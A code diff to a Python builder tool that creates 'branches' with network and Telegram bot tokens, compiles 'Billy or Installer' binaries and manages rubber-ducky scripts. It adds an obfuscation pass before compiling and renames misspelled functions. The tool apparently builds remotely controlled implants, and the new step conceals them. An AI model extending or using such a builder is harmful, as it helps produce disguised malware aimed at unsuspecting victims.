@@ -7,6 +7,7 @@ import Update
 from __init__ import __version__, __longname__, __author__
 import warnings
 import Encryption
+import Obfuscation
 
 
 def greeting():
@@ -126,9 +127,15 @@ def createNewBranch():
         default_pref=Colors.default_pref))
     Branch.edit_parser(network_token, branch_name, bot_token)
 
+    print('\n{default_pref}Obfuscating...'.format(
+        default_pref=Colors.default_pref))
+    Obfuscation.obfuscate()
+
     print('\n{default_pref}Compiling...'.format(
         default_pref=Colors.default_pref))
     status, paths = Branch.compile()
+
+    Obfuscation.delete_obfuscated_dir()
 
     Branch.restore_sample(network_token, branch_name, telegram_id)
 
@@ -136,8 +143,8 @@ def createNewBranch():
         print("\n{error_pref}Error occured compiling Billy or Installer: ".format(
             error_pref=Colors.error_pref))
         print(paths, end='')
-        Branch.delete_network_brunch(network_token, branch_name)
-        Branch.delete_brunch_from_parser(network_token, branch_name)
+        Branch.delete_network_branch(network_token, branch_name)
+        Branch.delete_branch_from_parser(network_token, branch_name)
         Branch.delete_binary_files()
         return 1
 
@@ -208,9 +215,9 @@ def delete_branch():
 
     processing()
 
-    Branch.delete_network_brunch(network_token, branch_name)
+    Branch.delete_network_branch(network_token, branch_name)
 
-    Branch.delete_brunch_from_parser(network_token, branch_name)
+    Branch.delete_branch_from_parser(network_token, branch_name)
 
     Branch.delete_rubber_ducky_script(branch_name, branch_os)
 
